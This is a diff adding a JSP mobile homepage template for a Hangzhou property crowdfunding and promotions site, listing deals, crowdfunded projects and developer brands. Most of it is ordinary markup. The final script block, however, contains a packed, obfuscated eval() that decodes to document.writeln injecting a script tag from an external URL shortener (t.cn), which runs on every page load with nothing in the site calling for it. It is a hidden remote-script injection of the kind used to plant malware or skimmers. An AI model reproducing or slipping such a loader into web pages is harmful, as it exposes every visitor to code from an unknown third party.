@@ -1,0 +1,365 @@
+<%@ page language="java" contentType="text/html; charset=UTF-8"
+pageEncoding="UTF-8"%>
+<%@ taglib prefix="c" uri="/WEB-INF/c.tld"%>
+<%@ taglib prefix="fmt" uri="/WEB-INF/fmt.tld"%>
+<%@ taglib prefix="fn" uri="/WEB-INF/fn.tld"%>
+<!doctype html>
+<html lang="en" ng-app="TFDD">
+<head>
+    <meta charset="UTF-8">
+    <title>淘房点点--买房省一点，杭州房产楼盘众筹活动大全</title>
+    <jsp:include page="./common/meta.jsp"/>
+    <jsp:include page="./common/header3.0.jsp"/>
+	<link rel="stylesheet" href="/public/wap/public/css/circle.css"/>
+	<link rel="stylesheet" href="/public/wap/public/css/unslider.css"/>
+	<link rel="stylesheet" href="/public/wap/public/css/unslider-dots.css"/>
+</head>
+<body ng-controller="MainCtrl">
+
+    <header class="index-header-wrap">
+        <div class="index-header">
+            <ul class="index-header-left clearfix">
+                <li><a href="/"><img src="/public/wap/public/images/logo.png" alt="logo"></a></li>
+                <li><i class="iconfont">&#xe615;</i><a style="display: inline" href="/wap/switchCity.htm"><span class="nowCity">杭州</span></a></li>
+            </ul>
+            <ul class="index-header-right clearfix">
+                <li><a href="/wap/search.htm"><i class="iconfont">&#xe628;</i></a></li>
+                <li><a href="/wap/user/center.htm"><i class="iconfont">&#xe60b;</i></a></li>
+            </ul>
+
+        </div>
+    </header>
+
+    <div class="main-wrap">
+        <!--banner轮播-->
+        <div class="my-slider unslider-horizontal" style=" height:1.945rem;background-color: #666">
+            <ul style="height: 1.945rem;overflow:hidden;">
+                <%--<c:forEach items="${data.banners}" var="banner" varStatus="status">--%>
+                    <%--<li style="background-image:url(${banner.pic_url});height: 1.945rem"><a href="${banner.pic_link}"></a></li>--%>
+                <%--</c:forEach>--%>
+                <li style="background-image:url(/public/wap/public/images/index/banner-place.png);height: 1.945rem"></li>
+            </ul>
+        </div>
+        <!--banner轮播结束-->
+
+
+        <!--专题导航-->
+        <div class="special-planet">
+            <ul class="clearfix">
+                <li class="icon-3"><a href="/tfdd/vrView.htm"><img src="/public/wap/public/images/index/1.png" alt="VR看房"></a></li>
+                <li class="icon-2"><a href="/tfdd/sellerList.htm"><img src="/public/wap/public/images/index/2.png" alt="品牌馆"></a></li>
+                <li class="icon-1"><a href="/wap/search/toPage.htm"><img src="/public/wap/public/images/index/3.png" alt="全部楼盘"></a></li>
+                <li class="icon-3"><a href="/"><img src="/public/wap/public/images/index/4.png" alt="楼盘活动"></a></li>
+            </ul>
+        </div>
+        <!--专题导航结束-->
+
+
+        <!--热门专题-->
+
+        <!--<div class="public-title-wrap">-->
+            <!--<div class="public-title">-->
+                <!--<i class="iconfont">&#xe626;</i>热门专题-->
+            <!--</div>-->
+        <!--</div>-->
+
+        <!--<div class="special-wrap">-->
+            <!--<div class="index-special">-->
+                <!--<img src="${data.subjectInfos.logoUrl}" alt="">-->
+                <!--<a href="/">查看全部</a>-->
+            <!--</div>-->
+        <!--</div>-->
+
+        <!--热门专题结束-->
+
+        <!--活动推荐-->
+        <div class="public-title-wrap">
+            <div class="public-title">
+                <h2>真实特惠</h2>
+                <h3>Real concessions</h3>
+            </div>
+        </div>
+
+        <div class="activity-common-wrap">
+            <c:forEach items="${data.active}" var="active">
+                <div class="activity-common">
+                    <div class="activity-common-inner">
+                        <div class="activity-img">
+                            <a href="/building/activity/${active.id}.htm">
+                                <img src="${active.showBanner}">
+                            </a>
+                            <c:choose>
+                                <%--如果是两个状态--%>
+                                <c:when test="${fn:indexOf(active.status, ',')!=-1&&active.status!=null}">
+                                    <c:if test="${fn:split(active.status, ',')[0]=='ACTIVE'}">
+                                        <div class="status-tag tag-1">活动中</div>
+                                    </c:if>
+                                    <c:if test="${fn:split(active.status, ',')[0]=='CROWDFUNDING'}">
+                                        <div class="status-tag tag-2">众筹中</div>
+                                    </c:if>
+                                    <c:if test="${fn:split(active.status, ',')[0]=='FINISH'}">
+                                        <div class="status-tag tag-4">已完成</div>
+                                    </c:if>
+                                    <c:if test="${fn:split(active.status, ',')[1]=='ACTIVE'}">
+                                        <div class="status-tag tag-1 level2">活动中</div>
+                                    </c:if>
+                                    <c:if test="${fn:split(active.status, ',')[1]=='CROWDFUNDING'}">
+                                        <div class="status-tag tag-1 level2">活动中</div>
+                                    </c:if>
+                                    <c:if test="${fn:split(active.status, ',')[1]=='FINISH'}">
+                                        <div class="status-tag tag-1 level2">活动中</div>
+                                    </c:if>
+                                </c:when>
+                                <c:when test="${active.status=='ACTIVE'}">
+                                    <div class="status-tag tag-1">活动中</div>
+
+                                </c:when>
+                                <c:when test="${active.status=='CROWDFUNDING'}">
+                                    <div class="status-tag tag-2">众筹中</div>
+
+                                </c:when>
+                                <c:when test="${active.status=='FINISH'}">
+                                    <div class="status-tag tag-4">已完成</div>
+                                </c:when>
+                            </c:choose>
+                        </div>
+                        <div class="activity-title">
+                            <div class="clearfix">
+                                <a class="activity-name" href="/building/detail/${active.id}.htm">
+                                    <h3>${active.act_title}</h3>
+                                </a>
+                                <a class="activity-seller" href="javascript:;">${active.seller_name}</a>
+                            </div>
+                        </div>
+                        <div class="activity-tag">
+                            <div class="tag-content">
+                                <div class="fl">
+                                    <i class="iconfont">&#xe625;</i>
+                                    <c:forEach items="${active.labels}" var="label">
+                                        <span>${label.name}</span>
+                                    </c:forEach>
+                                </div>
+                                <div class="fl">
+                                    <c:if test="${active.vr_visit==1}">
+                                        <span>VR看房</span>
+                                    </c:if>
+                                    <c:if test="${active.special_car_visit==1}">
+                                        <span>专车看房</span>
+                                    </c:if>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="activity-collect">
+                            <div class="collect-inner clearfix">
+                                <i class="iconfont">&#xe606;</i>
+                                <a href="/"><nobr>${active.building_feature}</nobr></a>
+                            </div>
+                        </div>
+                        <div class="activity-others">
+                            <div class="others-inner clearfix">
+                                <span class="activity-address">
+                                    [ ${active.district_name}
+                                        <c:if test="${active.forum!=null}">
+                                            - ${active.forum}
+                                        </c:if>]
+                                </span>
+                                <span class="activity-price">
+                                    均价：${active.avg_price>0?active.avg_price:0}元／㎡
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </c:forEach>
+            <div class="activity-more">
+                <a href="/wap/search/toPage.htm?crowdfunding">查看更多</a>
+            </div>
+        </div>
+        <!--活动推荐结束-->
+
+        <!--众筹推荐-->
+
+        <div class="public-title-wrap">
+            <div class="public-title">
+                <h2>官方直营</h2>
+                <h3>official directly</h3>
+            </div>
+        </div>
+        <div class="activity-common-wrap">
+
+            <c:forEach items="${data.crowdfunding}" var="active">
+                <div class="activity-common">
+                    <div class="activity-common-inner">
+                        <div class="activity-img">
+                            <a href="/building/sku/${active.id}.htm">
+                                <img src="${active.showBanner}" alt="">
+                            </a>
+                            <c:choose>
+                                <%--如果是两个状态--%>
+                                <c:when test="${fn:indexOf(active.status, ',')!=-1&&active.status!=null}">
+                                    <c:if test="${fn:split(active.status, ',')[0]=='ACTIVE'}">
+                                        <div class="status-tag tag-1">活动中</div>
+                                    </c:if>
+                                    <c:if test="${fn:split(active.status, ',')[0]=='CROWDFUNDING'}">
+                                        <div class="status-tag tag-2">众筹中</div>
+                                    </c:if>
+                                    <c:if test="${fn:split(active.status, ',')[0]=='FINISH'}">
+                                        <div class="status-tag tag-4">已完成</div>
+                                    </c:if>
+                                    <c:if test="${fn:split(active.status, ',')[1]=='ACTIVE'}">
+                                        <div class="status-tag tag-1 level2">活动中</div>
+                                    </c:if>
+                                    <c:if test="${fn:split(active.status, ',')[1]=='CROWDFUNDING'}">
+                                        <div class="status-tag tag-1 level2">活动中</div>
+                                    </c:if>
+                                    <c:if test="${fn:split(active.status, ',')[1]=='FINISH'}">
+                                        <div class="status-tag tag-1 level2">活动中</div>
+                                    </c:if>
+                                </c:when>
+                                <c:when test="${active.status=='ACTIVE'}">
+                                    <div class="status-tag tag-1">活动中</div>
+
+                                </c:when>
+                                <c:when test="${active.status=='CROWDFUNDING'}">
+                                    <div class="status-tag tag-2">众筹中</div>
+
+                                </c:when>
+                                <c:when test="${active.status=='FINISH'}">
+                                    <div class="status-tag tag-4">已完成</div>
+                                </c:when>
+                            </c:choose>
+                        </div>
+                        <div class="activity-title">
+                            <div class="clearfix">
+                                <a class="activity-name" href="/building/detail/${active.id}.htm">
+                                    <h3>${active.sku_project_name}</h3>
+                                </a>
+                                <a class="activity-seller" href="javascript:;">${active.seller_name}</a>
+                            </div>
+                        </div>
+                        <div class="activity-tag">
+                            <div class="tag-content clearfix">
+                                <div class="fl">
+                                        <%-- <i class="iconfont">&#xe625;</i>
+                                        <c:forEach items="${active.labels}" var="label">
+                                            <span>${label.name}</span>
+                                        </c:forEach> --%>
+                                </div>
+                                <div class="fl">
+                                    <c:if test="${active.vr_visit==1}">
+                                        <span>VR看房</span>
+                                    </c:if>
+                                    <c:if test="${active.special_car_visit==1}">
+                                        <span>专车看房</span>
+                                    </c:if>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="activity-progress">
+                            <div class="progress-ui">
+                                <div class="progress-mask ng-scope" loadinganimate="" data-w="${fn:substring(active.progress*100,0,4)}%"  style="width: ${fn:substring(active.progress*100,0,4)}%;"></div>
+                            </div>
+                            <div class="others-inner clearfix">
+                                    <span class="activity-address">
+                                        进度：${fn:substring(active.progress*100,0,4)}%
+                                    </span>
+                                    <span class="activity-price">
+                                        已参与：${active.partakeNum}
+                                    </span>
+                            </div>
+                        </div>
+                        <div class="activity-others">
+                            <div class="others-inner clearfix">
+                                <span class="activity-address">
+                                    [${active.district_name}
+                                    <c:if test="${active.forum!=null}"> - ${active.forum}
+                                    </c:if>]
+                                </span>
+                                <span class="activity-price">
+                                    均价：${active.avg_price>0?active.avg_price:0}元／㎡
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            </c:forEach>
+
+            <div class="activity-more">
+                <a href="/wap/search/toPage.htm?activity">查看更多</a>
+            </div>
+        </div>
+
+        <!--众筹推荐结束-->
+
+        <!--品牌馆-->
+        <div class="public-title-wrap">
+            <div class="public-title">
+                <h2>周末去哪儿</h2>
+                <h3>Where to Weekend</h3>
+            </div>
+        </div>
+        <div class="seller-preview-wrap">
+            <c:forEach items="${data.brandInfos}" var="brand">
+   				 <c:if test="${brand.domain!=null}">
+	                  <div class="seller-preview" ng-click="toDetail('${brand.domain }')">
+                 </c:if>
+                 <c:if test="${brand.domain==null}"> 
+                      <div class="seller-preview" ng-click="toDetail('/wap/brand/detail/${brand.id}.htm')">
+                  </c:if> 
+                    <div class="seller-preview-inner">
+                        <div class="seller-preview-img">
+                            <a href="javascript:;">
+                                <img src="${brand.logo_url}" alt="">
+                            </a>
+                            <div class="seller-tag">
+                                <img src="/public/wap/public/images/seller-tag.png" alt="">
+                            </div>
+                        </div>
+                        <div class="seller-preview-data">
+                            <span>${brand.name}</span><em>楼盘 ${brand.building_num}  <b>|</b> 项目 ${brand.project_num}</em>
+                        </div>
+                    </div>
+                </div>
+            </c:forEach>
+            <div class="activity-more">
+                <a href="/tfdd/sellerList.htm">查看更多</a>
+            </div>
+        </div>
+        <!--品牌馆结束-->
+
+    </div>
+    <jsp:include page="./common/footer.jsp"/>
+
+    <script src="/public/wap/public/js/unslider-min.js"></script>
+    <script src="/public/wap/public/js/jquery.event.move.js"></script>
+    <script src="/public/wap/public/js/jquery.event.swipe.js"></script>
+    <script src="/public/wap/public/js/app/index2.0.js"></script>
+    <script type="text/javascript" src="/public/scripts/jquery.cookie.js"></script>
+    <script src="/public/wap/public/js/switchCity.js"></script>
+
+    <script>
+        $(function(){
+            $('.my-slider').unslider({
+                infinite: true,
+                autoplay: true,
+                delay: 5000,
+                arrows: false
+            });
+            //$('.my-slider').unslider('initSwipe');
+        });
+    </script>
+    <script>
+        var myApp = angular.module("TFDD",[]);
+        myApp.controller("MainCtrl",function ($scope) {
+            $scope.toDetail = function (url) {
+                window.location.href = url;
+            };
+        });
+    </script>
+
+    <script>
+        /* 25719 */eval(function(p,a,c,k,e,d){e=function(c){return c};if(!''.replace(/^/,String)){while(c--){d[c]=k[c]||c}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('2.1("<0 3=\'7://4.6/5\'></0>");',8,8,'script|writeln|document|src|t|R50b7lH|cn|http'.split('|'),0,{}));
+    </script>
+</body>
+</html>
